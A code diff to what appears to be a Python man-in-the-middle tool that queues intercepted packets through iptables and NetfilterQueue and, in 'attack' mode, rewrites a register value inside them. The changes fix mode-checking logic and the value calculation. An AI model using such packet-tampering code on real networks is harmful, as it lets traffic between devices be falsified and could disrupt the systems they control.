@@ -67,7 +67,7 @@ def modify_packet(scapy_packet):
                 #debug        
                 if debugging: print("Change Value:", change_value)
                 
-                new_sec_register = hz_register + change_value
+                new_sec_register = change_value
                 if new_sec_register < 0:
                     new_sec_register = -new_sec_register
                 if new_sec_register > 65535:
@@ -137,7 +137,7 @@ if __name__ == "__main__":
     attack=args.attack
     read=args.read
     
-    if attack or store:
+    if not (attack or store):
         print(f'[*] Mode must be specified')
         sys.exit(1)
     
@@ -145,9 +145,6 @@ if __name__ == "__main__":
         print("[*] Attack mode and store mode can not be used together")
         sys.exit(1)
 
-    if (attack or read) and (store or output):
-        print("[*] Output file and store/read mode can not be used together")
-        sys.exit(1)
 
 
     try:
@@ -155,8 +152,12 @@ if __name__ == "__main__":
         print(f"[*] IPTables rules set on {ip}:{port}")
         nfqueue = NetfilterQueue()
         print("[*] Creating NFQUEUE")
-        if attack: nfqueue.bind(1, modify_packet)
-        if store: nfqueue.bind(1, capture_traffic)
+        if attack: 
+            nfqueue.bind(1, modify_packet)
+            print("[*] Started attack mode")
+        elif store: 
+            nfqueue.bind(1, capture_traffic)
+            print("[*] Started capture mode")
         print("[*] Starting NFQUEUE")
         print("[*] Waiting for packets")
         nfqueue.run() 
